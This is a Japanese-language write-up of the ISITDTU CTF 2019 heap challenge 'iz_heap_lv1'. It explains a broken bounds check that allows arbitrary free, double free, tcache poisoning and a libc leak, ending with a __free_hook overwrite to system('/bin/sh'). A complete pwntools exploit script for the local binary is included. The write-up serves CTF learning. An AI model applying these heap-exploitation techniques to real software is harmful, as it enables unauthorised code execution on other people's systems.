---
tags: pwn
---

# ISITDTU CTF 2019 Quals - iz_heap_lv1

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/isitdtu-team/ISITDTU-CTF-2019>

## Writeup

### Outline

libc 2.27でPIEだけ無効、create+edit, edit(というよりremake), delete, show name, edit nameが出来る、createした領域のshowは原則として出来ない。
ポインタの管理がかなり厳重でfree時にポインタがクリアされてしまうのでDouble FreeとUAFは簡単には出来ない
サイズ指定, インデックス指定もかなり厳重のように思えるが実は条件演算子のorとandを間違えているせいでサイズとインデックスには制限が無い。これとポインタを管理する配列の下に名前を管理するグローバル変数があることを利用すると名前をポインタ配列の一部とみなすことが出来、仕込んであるアドレスをfree出来る。この仕様を利用して違うインデックスに同じアドレスを仕込んでDouble Freeが出来る。
同時に名前中に偽装チャンクを仕込んでそこを踏み台にしてtcache poisoningをし、名前の真上に`mchunk_size`を用意して名前をfreeする。これでUnsorted Binに送って名前のshowでlibc leakする。
後は同様の手順でtcache poisoningをして`__free_hook`を書き換える。

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Binary

### vulnerability

deleteのようなインデックスを要求する関数ではインデックスチェックを行っているが次のようになっている。

```clike
  if ((iVar1 < 0) && (0x14 < iVar1)) {
    puts("Invalid index!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```

本来だったら入力インデックスが0以上0x14以下であるようにしたかったのだろうが、`||`ではなく`&&`であることからどのような数字でも通るようになっている。
ちなみにサイズ部分も本来はfastbinにしか入らないサイズ(正数で0x7f以下)と制限があるはずだったのが同様のミスでどのようなサイズでも受け付けるようになっている。よって心置きなくUnsorted Bin Attackが出来る。

### 任意アドレスのfree

↑のインデックスに任意の値を指定できるというバグのおかげで本来だったら領域外にあるはずのポインタをfreeすることが出来る。

```clike
  if (*(long *)(&ptr_list + (long)iVar1 * 8) != 0) {
    free(*(void **)(&ptr_list + (long)iVar1 * 8));
    *(undefined8 *)(&ptr_list + (long)iVar1 * 8) = 0;
    return;
  }
```

.bssセクションをよく読むと`ptr_list`の下に名前を確保するグローバル変数があるので事前に名前にアドレスを入れておけばそこに対応するインデックスを指定してfreeすることで任意アドレスのfreeが出来る。具体的にはインデックス20が名前の先頭に対応している。

### Double Freeの引き起こし方

↑で任意アドレスのfreeが出来ることを示したがこれを利用するとDouble Freeが出来る。
名前の中に同じアドレスを2箇所仕込んでおく。そしてそこに対応するインデックスをそれぞれfreeすると当然Double Freeが引き起こされる。
ちなみに名前はサイズにして0x100も入力出来るので予め大量のアドレスをここに用意しておくことが出来る。

### 最初のtcache poisoning

今回は一度freeしたポインタがクリアされてしまう都合上、heap領域上のチャンクに対してDouble FreeやUAFをすることは難しい。そこでアドレスも分かっている.bssセクション中でチャンクを偽装する。
当然最初からここにチャンクが確保されるなどという都合の良いことは起こらないのでまずは自分で`mchunk_size`を設置しておき、その下のアドレスを前述の手法でDouble Freeすることからtcache poisoningに繋げる。

### libc leak

今回はまともなshow機能が無く、唯一のshow機能が名前だけなので名前部分をチャンクとして確保してからfreeしてUnsorted Bin Attackでlibc leakをする。
まずここをfreeするためには`mchunk_size`部分が欲しいので前述のtcache poisoning方法でここを偽装する、もちろん位置は名前の真上である。
無事にサイズを偽装出来たら名前中に仕込んでおいた名前部分のアドレスをfreeしてここをチャンクとして確保する。この時、事前に名前入力時に`main_arena->top`とのconsolidationを防ぐチャンクを用意しておけばUnsorted Binへ送られるのでshow nameでここを読んでlibc leak出来る。
今回は[redpwnCTF 2020 - four function heap](/eFJwsVn3R_uH3KWwVftX2A)同様にtcache poisoningでカウンタを0xffへとオーバーフローさせる手法を用いた、これ使いやすくて好き

### いつもの

あとは前述の手法で再びtcache poisoningを引き起こして`__free_hook`にシェル起動アドレスを仕込む。今回は`system("/bin/sh")`を利用した。

## Code

```python
from pwn import process, p64, u64, ELF


def select(s, sel, c=b"Choice: "):
    s.recvuntil(c)
    s.sendline(str(sel))


def add(s, size, data=b"junk"):
    select(s, 1)
    s.recvuntil(b"size: ")
    s.sendline(str(size))
    s.recvuntil(b"data: ")
    s.send(data)


def delete(s, idx):
    select(s, 3)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))


def edit(s, idx, size, data):
    select(s, 2)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"size: ")
    s.sendline(str(size))
    s.recvuntil(b"data: ")
    s.send(data)


def show(s):
    select(s, 4)
    s.recvuntil(b"(Y/N)")
    s.sendline(b"N")
    s.recvuntil(b"Name: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    """
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    """
    """
        - delete時にポインタ0クリア
        - indexとsizeは条件設定ミスで制限が無い
    """
    s = process("./iz_heap_lv1")
    elf = ELF("./iz_heap_lv1")
    name_addr = 0x602100
    libc = ELF("./libc.so.6")
    arena_libc = 0x3ebc40

    s.recvuntil(b"name: ")
    pad = p64(0) * 2
    payload = p64(0) + p64(0xa1) + \
            p64(name_addr + 0x10) * 2 + \
            p64(name_addr) + \
            p64(name_addr + 0xa0) * 2 + p64(0) + \
            pad * 0x5 + \
            p64(0) + p64(0x21) + \
            pad + \
            p64(0) + p64(0x21)
    s.send(payload)
    add(s, 0x18)

    delete(s, 22)
    delete(s, 23)
    add(s, 0x98, p64(name_addr - 0x10))
    add(s, 0x98)
    add(s, 0x98, p64(0) + p64(0xa1))
    delete(s, 24)

    libc_addr = u64(show(s).ljust(8, b"\x00")) - arena_libc - 0x60
    free_hook_addr = libc_addr + libc.symbols["__free_hook"]
    system_addr = libc_addr + libc.symbols["system"]
    print(hex(libc_addr))

    delete(s, 25)
    delete(s, 26)
    add(s, 0x18, p64(free_hook_addr))
    add(s, 0x18)
    add(s, 0x18, p64(system_addr))

    edit(s, 0xc, 0x28, b"/bin/sh")
    delete(s, 0xc)

    s.interactive()

```

## Flag

ローカルでシェル取っただけ

## 感想

PIE無効だし余裕だろ、と思ったらshowが制限付きだしポインタが結構硬いしで苦労した
ちなみに1番の反省点はうろおぼえの癖にmain_arenaのオフセットを何も見ないで入力した結果、見事に間違えていたことです